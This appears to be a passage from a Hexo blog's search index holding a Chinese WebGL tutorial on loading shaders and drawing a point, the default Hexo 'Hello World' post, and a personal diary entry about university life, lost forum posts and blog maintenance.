msg <span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">var</span> fragElem <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span> fragmentShaderId <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>fragElem <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token function">alert</span><span class="token punctuation">(</span> <span class="token string">"Unable to load vertex shader "</span> <span class="token operator">+</span> fragmentShaderId <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        fragShdr <span class="token operator">=</span> gl<span class="token punctuation">.</span><span class="token function">createShader</span><span class="token punctuation">(</span> gl<span class="token punctuation">.</span><span class="token constant">FRAGMENT_SHADER</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>        gl<span class="token punctuation">.</span><span class="token function">shaderSource</span><span class="token punctuation">(</span> fragShdr<span class="token punctuation">,</span> fragElem<span class="token punctuation">.</span>text <span class="token punctuation">)</span><span class="token punctuation">;</span>        gl<span class="token punctuation">.</span><span class="token function">compileShader</span><span class="token punctuation">(</span> fragShdr <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>gl<span class="token punctuation">.</span><span class="token function">getShaderParameter</span><span class="token punctuation">(</span>fragShdr<span class="token punctuation">,</span> gl<span class="token punctuation">.</span><span class="token constant">COMPILE_STATUS</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">var</span> msg <span class="token operator">=</span> <span class="token string">"Fragment shader failed to compile.  The error log is:"</span>          <span class="token operator">+</span> <span class="token string">"&lt;pre>"</span> <span class="token operator">+</span> gl<span class="token punctuation">.</span><span class="token function">getShaderInfoLog</span><span class="token punctuation">(</span> fragShdr <span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"&lt;/pre>"</span><span class="token punctuation">;</span>            <span class="token function">alert</span><span class="token punctuation">(</span> msg <span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">var</span> program <span class="token operator">=</span> gl<span class="token punctuation">.</span><span class="token function">createProgram</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    gl<span class="token punctuation">.</span><span class="token function">attachShader</span><span class="token punctuation">(</span> program<span class="token punctuation">,</span> vertShdr <span class="token punctuation">)</span><span class="token punctuation">;</span>    gl<span class="token punctuation">.</span><span class="token function">attachShader</span><span class="token punctuation">(</span> program<span class="token punctuation">,</span> fragShdr <span class="token punctuation">)</span><span class="token punctuation">;</span>    gl<span class="token punctuation">.</span><span class="token function">linkProgram</span><span class="token punctuation">(</span> program <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>gl<span class="token punctuation">.</span><span class="token function">getProgramParameter</span><span class="token punctuation">(</span>program<span class="token punctuation">,</span> gl<span class="token punctuation">.</span><span class="token constant">LINK_STATUS</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">var</span> msg <span class="token operator">=</span> <span class="token string">"Shader program failed to link.  The error log is:"</span>            <span class="token operator">+</span> <span class="token string">"&lt;pre>"</span> <span class="token operator">+</span> gl<span class="token punctuation">.</span><span class="token function">getProgramInfoLog</span><span class="token punctuation">(</span> program <span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"&lt;/pre>"</span><span class="token punctuation">;</span>        <span class="token function">alert</span><span class="token punctuation">(</span> msg <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> program<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>但我觉得把GLSL代码放在html里还是不好管理，html代码的可读性变差了，还是放在文件里容易维护，于是就有了第三个方法。</p><p> </p><h3 id="从文件加载着色器">从文件加载着色器</h3><p>从文件加载着色器需要创建一个XMLHttpRequest对象request来加载指定文件，事实上后面我们加载model时也要用到类似方法。可以将加载着色器的过程视作一个资源加载的过程，甚至我是在获取canvas对象之前加载的，因为加载过程和绘图无关。</p><p>fileName指定了文件加载的路径，记得采用相对路径。onLoadShaderFile是注册的事件响应函数，它将在文件加载完成时被调用。加载的着色器代码被作为字符串对象存储，当两者都加载完成时，回到main()函数进行下一步操作。</p><p>关键代码如下：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">loadShaderFile</span><span class="token punctuation">(</span><span class="token parameter">fileName<span class="token punctuation">,</span> shader</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">var</span> request <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  request<span class="token punctuation">.</span><span class="token function-variable function">onreadystatechange</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>readyState <span class="token operator">===</span> <span class="token number">4</span> <span class="token operator">&amp;&amp;</span> request<span class="token punctuation">.</span>status <span class="token operator">!==</span> <span class="token number">404</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token function">onLoadShaderFile</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>responseText<span class="token punctuation">,</span> shader<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  request<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'GET'</span><span class="token punctuation">,</span> fileName<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  request<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">onLoadShaderFile</span><span class="token punctuation">(</span><span class="token parameter">fileString<span class="token punctuation">,</span> type</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>type <span class="token operator">==</span> <span class="token string">'VERTEX_SHADER'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token constant">VERTEX_SHADER</span> <span class="token operator">=</span> fileString<span class="token punctuation">;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"vertex shader:"</span> <span class="token operator">+</span> <span class="token constant">VERTEX_SHADER</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>type <span class="token operator">==</span> <span class="token string">'FRAGMENT_SHADER'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token constant">FRAGMENT_SHADER</span> <span class="token operator">=</span> fileString<span class="token punctuation">;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"vertex shader:"</span> <span class="token operator">+</span> <span class="token constant">FRAGMENT_SHADER</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>   <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token constant">VERTEX_SHADER</span> <span class="token operator">&amp;&amp;</span> <span class="token constant">FRAGMENT_SHADER</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token constant">FLAG_SHADER_LOADED</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>从文件加载意味着我们可以比较方便地管理多个着色器对象，这对WebGL高级编程或许有意义(我还没学到hhh)。</p><p> <br>至此,我们了解了三种加载着色器的方式，但对着色器内部代码的意义，以及如何使用着色器进行绘制还没有涉及。下面将通过一个简单的程序来说明。</p><p> </p><h2 id="简单的WebGL程序">简单的WebGL程序</h2><p>下面我们将绘制一个最简单的图形——一个位于原点的10个像素大的红色的点。实际效果中将为一个矩形，因为对WebGL来说绘制矩形比绘制圆更快。</p><p> </p><h3 id="顶点着色器">顶点着色器</h3><p>顶点着色器定义了点的相关性质，在这里我们定义了点的位置和大小：</p><pre class="line-numbers language-glsl" data-language="glsl"><code class="language-glsl"><span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  gl_Position <span class="token operator">=</span> <span class="token keyword">vec4</span><span class="token punctuation">(</span><span class="token number">0.0</span><span class="token punctuation">,</span> <span class="token number">0.0</span><span class="token punctuation">,</span> <span class="token number">0.0</span><span class="token punctuation">,</span> <span class="token number">1.0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//设置坐标</span>  gl_PointSize <span class="token operator">=</span> <span class="token number">10.0</span><span class="token punctuation">;</span>  <span class="token comment">//设置尺寸</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>gl_Position和gl_PointSize是顶点着色器内置的变量，你必须传值给这两个变量。不同于JS，GLSL是一种强类型的语言，gl_Position的类型是vec4，相当于长度为4的矢量，每个值的类型都是float。它表示顶点的齐次坐标。gl_PointSize的类型也是float，所以这里的10.0不能写成10。vec4是GLSL内置的构造函数，在JS里，通过math-utils.js的函数库，我们也创建了类似的一连串的vec2,vec3,vec4的构造函数。</p><p> </p><h3 id="WebGL坐标系">WebGL坐标系</h3><p>与canvas坐标系不同，WebGL坐标系的原点在canvas正中间，且是一个三维坐标系，具有x轴(从左往右)，y轴(从下往上)，z轴(从屏幕里往屏幕外)。x,y的坐标范围均为-1.0-1.0。在涉及深度之前，暂不讨论z轴，只把它定为0.0。</p><p> </p><h3 id="片元着色器">片元着色器</h3><p>片元着色器里，我们定义了该点的颜色：</p><pre class="line-numbers language-glsl" data-language="glsl"><code class="language-glsl"><span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  gl_FragColor <span class="token operator">=</span> <span class="token keyword">vec4</span><span class="token punctuation">(</span><span class="token number">1.0</span><span class="token punctuation">,</span> <span class="token number">0.0</span><span class="token punctuation">,</span> <span class="token number">0.0</span><span class="token punctuation">,</span> <span class="token number">1.0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//设置颜色</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>类似于顶点着色器，片元着色器的内置变量是gl_FragColor。这个四维向量代表RGBA值，范围不同于之前用过的，WebGL遵循了Opengl颜色分量的取值范围，所以四个参数范围在这里都是0.0-1.0。</p><p> </p><h3 id="清空绘图区">清空绘图区</h3><p>进行绘制前，我们首先要清空一次颜色缓冲区。首先指定清空缓冲区的背景颜色，然后清空缓冲区。</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">//指定清空颜色缓冲区的颜色</span>gl<span class="token punctuation">.</span><span class="token function">clearColor</span><span class="token punctuation">(</span><span class="token number">0.0</span><span class="token punctuation">,</span> <span class="token number">1.0</span><span class="token punctuation">,</span> <span class="token number">0.0</span><span class="token punctuation">,</span> <span class="token number">1.0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//清空颜色缓冲区</span>gl<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span>gl<span class="token punctuation">.</span><span class="token constant">COLOR_BUFFER_BIT</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>一旦指定了背景色，背景色就会驻存在WebGL系统中，在下一次调用gl.clearColor()方法前不会改变。</p><p> </p><h3 id="画一个点">画一个点</h3><p>使用gl.drawArrays(mode, first, count)函数进行绘制。</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">//绘制一个点</span>gl<span class="token punctuation">.</span><span class="token function">drawArrays</span><span class="token punctuation">(</span>gl<span class="token punctuation">.</span><span class="token constant">POINTS</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>顶点着色器会被执行count次，随后每个顶点调用一次片元着色器。</p><p>怎么用看这个:</p><p><img src="/2020/01/20/webgl1/1720266250314.png" alt=""></p><p>至此，就完成了一个点的绘制。效果如下(恶趣味的红配绿)：</p><p><img src="/2020/01/20/webgl1/1720266261758.png" alt=""></p><p>本文的代码放在<a href="https://github.com/AshenAshes/WebGL-MidSummer_Night/tree/WebGL1">github</a>。</p><p>考虑到后续可能的一些骚操作，对initShaders()进行了一些改写，把绑定program提出来了。</p><p> </p><h2 id="参考资料">参考资料</h2><p>[1] 《WebGL Programming Guide》Kouichi Matsuda, Rodger Lea</p>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WebGL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2019/05/20/hello-world/"/>
      <url>/2019/05/20/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><p>It's a line for test.</p><h1>Quick Start</h1><h2 id="Quick-Start">Quick Start</h2><h3 id="Quick-Start-2">Quick Start</h3><h4 id="Quick-Start-3">Quick Start</h4><h5 id="Quick-Start-4">Quick Start</h5><h6 id="Quick-Start-5">Quick Start</h6><h3 id="Create-a-new-post">Create a new post</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server">Run server</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files">Generate static files</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo generate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites">Deploy to remote sites</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c">$ hexo deploy<span class="token keyword">int</span> main<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Neverland</title>
      <link href="/1999/08/28/Neverland/"/>
      <url>/1999/08/28/Neverland/</url>
      
        <content type="html"><![CDATA[<blockquote><p>记录Blog创建以来的一些想法。</p></blockquote><span id="more"></span><p>  </p><p>  </p><p>2020.7.5</p><p>大一的时候不知道从什么地方找到了hzw学长的blog，看到了那篇&quot;再见，OI&quot;，用文中的话来形容当时的感受就是&quot;当年的热血热的像鸡汤&quot;。今天又看了一遍，羡慕而心酸，似乎我的高中时代总是充满遗憾，成绩经历朋友。大学数年间曾无数次幻想自己能在高中参加OI，但学校似乎从来没有出过有名的OI选手，连省赛拿奖项似乎也没有听说过。班里的几位参加的同学只是把它当成逃课和玩乐的工具。唯一牛逼到能进国家队的是我毫无兴趣的生物竞赛。于是只是一名平凡的高考考生，把大量时间花费在重复而应试的高考上。</p><p>好朋友去参加了生物竞赛，她为了准备考试而停课搬去了竞赛专用教室，离高一高二的教学楼很远，在僻静的高三教学区，被我们戏称为&quot;西伯利亚&quot;的地方。她临走前在课桌的缝隙间插了一朵小花，开玩笑说那朵花就代表着她的存在。后来高三我也去了竞赛教室旁边的一个自习室写题目，晚自修下课透过巨大的玻璃窗，只望见对面教学楼回寝室的人熙熙攘攘，而我一个人在偌大的教室里，只感受到一种寂静的孤独。</p><p>前同桌是MO选手，在成为我同桌后在数学方面帮我良多，比赛刷题的日子还有点历历在目。在高二下的期末前同桌去参加了中科大少年班的选拔，与当年的高三一起参加了那届高考，考了640左右的一个成绩，幸运地通过了。于是我又回到一个人孤军奋战的日子。后来高三数学老师提起他，说他是“金菩萨”，我们底下这帮人都是自身难保的“泥菩萨”，我忘了当时坐在下面在想什么了，但这段话却印象很深刻。</p><p>后来上了大学，见到了很多考败来浙的OI大佬，聚在一起侃侃而谈算法的样子，是我永远羡慕的场景。ADS期末考难倒大片人的算法题，只是他们眼中可能连OI初赛难度都算不上的题目。那时候我就想起了一句话，&quot;有时候人与人之间的差距，比人与猪之间的差距还要大&quot;。</p><p>大学初有很多梦想，想搞ACM，CTF，CG，后来都没有实现，大多半途而废，只是脑中的纸上谈兵。大一谈了一场失败而抑郁的恋爱，大二整年浑浑噩噩地过去了，大三寝室重组，愈发压抑。</p><p>我不知道ZJU学生的抑郁率与suicide rate在所有C9里是不是最高的，但我确实越发明晰而深刻地感受到，在这个校园里，不同人群之间存在着的巨大的隔阂与天然的差距，宛如天堑。当你无法抓住任何一种标签印刻在自己身上，就只能越来越沉默与坠落。</p><p>  </p><p>  </p><p>2019.7.25</p><p>学期初因为小王的关系了解到Hexo，之前也确实看到过一些前辈的Blog，当时没有深究是怎么实现的。看到小王很开心地发Blog，半羡慕半跟风的心态，于是5月的时候照着一篇教程开始弄。</p><p>建好了以后因为懒，而且美化起来确实有点麻烦（强迫症_(:з」∠)_...），于是放置了很长一段时间没有去搞。期间也尝试先用markdown写一些笔记，比如DB\ADS的一些，不过感觉有点苦手，之后还是换回了oneNote。</p><p>中间虽然很长时间没有碰这个Blog，但很多时候还是会想起来，我要改哪些地方、之后打算发什么……之类的一些念头。想到自己，大一大二两年都有些迷茫，绩点什么的也都挺难看的，有时候不知道该做什么，或者明知道自己该做什么而不愿意去做、消极地逃避。大一上可能会是我大学四年里最认真的时间段了，虽然那个时候的我觉得自己真烂、怎么会这么菜，但从此时的角度回望过去，那个时候的投入程度比之现在也已经是可望不可即的程度了。</p><p>从大学开始到现在越来越自闭，在人多的地方一个人的话会感觉到一种被压迫的窒息感，于是我不经常去食堂了，一个人上课有时候也心不在焉，但如果碰到认识但不熟悉的人会感觉更加的怪...不知道怎么去改善，如果py她们在的话我可能会感觉好一些，但是大家都不在一个学校了...</p><p>我潜意识里觉得这个Blog可能会是能让我沉浸下来的一个东西，至少我有一个可以自己搭建的世界了。我看的那篇Hexo教程里引用了<a href="https://www.cnblogs.com/jhzhu/p/3893297.html">这篇文章</a>，里面讲到作者写博客的理由：</p><blockquote><p>一是, 我不再那么乐于去学新的注定不会成为体系的东西了, 因为它除了能展示一下小聪明, 时间回报率特别小.<br>二是, 如果我决定去深究一个东西, 我一定要完全搞懂, 并认真总结一篇博客让我以后能在短时间拾起来(因为不搞懂你很难写一篇半年后还能理解的博客).</p></blockquote><p>看到这段话以后我开始觉得完善自己的Blog不是那么一件虚无缥缈的事情了，至少它对我而言是有意义的。之前我总是东学一点、西学一点，但是半年过去、一年过去后，我又要花大量的时间从头开始捡起这样东西，从头开始再踩一遍我从前踩过的坑，这本不必要。如果我能记下来这些微小的东西，哪怕它本质上是很傻白甜的问题，但只要它对我有意义，那就是值得的。</p><p>对我而言，这个Blog的存在也有一点私心。几个月前知道了百度屏蔽了2017年前所有贴子的消息，一瞬间有种心如死灰的漠然。</p><p>如果以小学五年级为起点开始丈量，我人生有将近八年的时间是花费在贴吧上的——尽管高中开始的三年只是将其作为一个记录心情的地方。吧龄9.7年，发贴7415个，三个贴吧的吧主，在其中的投入已经不是用“心血”可以形容的了。而那些与形形色色来自全国各地的好友的回忆，那个在某个动漫贴吧经营过的流光字铺，那些一个字一个字敲出来的教程贴和个人向推荐贴，以及我悲哀的凝滞而不可挣脱的呓语，全都没有了。我不会再知道那个在我的碎碎念里路过，留下自己的文字，患有视神经病变的那个人是谁了；我不会再想起来曾经触动过我的那些故事的名字一一为何了；我不会再有机会写下那些蕴杂着彼时痛苦与扭曲的情感的文字了。我曾防备现实中记忆的证据的失落，但我不会想到有一天，连虚拟的记录也会不经挽留地消逝，并且是这样毫无征兆地。</p><p>我不可能再承受下一次数据的失落了，对于记忆力日渐下降的我而言，记录是必要的，但是我不能再把这些记录交给不可靠的第三方了。那样的代价是，当我试图离开他们的领域，我就将失去我的一切。</p><blockquote><p>我走的时候，我还不知道曾经的生活有一天，会需要证明。<br>有一天会再没有人能够相信过去。我也会对以往的一切产生怀疑。那是我曾有过的生活吗。<br>……<br>还有，在它们中间悄无声息度过童年、少年、青年时光的我，他的快乐、孤独、无人感知的惊恐与激动……对于今天的生活，它们是否变得毫无意义。</p></blockquote><p>  </p><p>  </p><p>2019.5.20</p><p>搭建了Blog，之后因为界面方面的问题一直在做一些小的修补：</p><blockquote><p>修复了首页挂掉的busuanzi API。<br>更换了各种图片，关闭了原有的评论，之后有空大概会换成valine。<br>在每篇文章底下加了pre和next，顺便改了下h1-h6的字体大小。<br>这个主题修了八百年的代码高亮终于修好了，这就是用冷门主题的代价吗？引入highlight.js包以后直接在layout.ejs最后加了。主题风格在加入的css里设置选择。原css与高亮存在冲突，修改了main.min.css里的pre&gt;code的颜色，注释掉了.highlight的整个部分。(这个主题的CSS真是让人摸不着头脑)<br>高亮还存在bug，进入页面需要刷新一次才能正常显示高亮。(懒得管了，以后再说)<br>...<br>2024.7.6 更新<br>升级了一下hexo本体，发现已经支持highlight和prismjs的语法高亮了，直接设置一下然后在主题的页面里导入prism.js和prism.css就行<br>本体的_config很搞，有个enable的设置项不写出来，需要自己加，总之highlight的enable:false，另一个为true<br>prism可以到prismjs.com/download.html去下载，还可以配置各种插件，自由度很高<br>原先乱七八糟的min.css，min.js删了一大堆，感觉都没什么用，重写了一下gulpfile.js，自己运行gulp就能压缩了<br>busuanzi的刷新还是有问题，暂时懒得解决了...<br>markdown换了个渲染器，卸载hexo-renderer-marked换成hexo-renderer-markdown-it<br>原先头痛的二级标题没下划线，其实在h2下面加一个html样式就解决了<br>图片的引用改成了hexo本身支持的写法，直接放在post目录下对应title的文件夹里即可，但是title即文件名不能有特殊字符<br>...<br>2024.7.7 更新<br>没想到吧这么快就回来了，那个不刷新的问题是那段pjax导致的，页面渲染时只刷新某个区域，感觉实在没有必要，毕竟我对性能没啥要求<br>加上那个pjax以后很多地方的写法都会很奇怪，于是注释了，神清气爽<br>评论valine也加了<br>文章的刷新时间暂时解决方法是自己在post前面加updated字段，总感觉不太优雅，但是取文件创建时间又不靠谱，那还是靠自己吧</p></blockquote><p>大抵是这些，之后若有对原主题的改动也会加在这里。</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 碎碎念 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
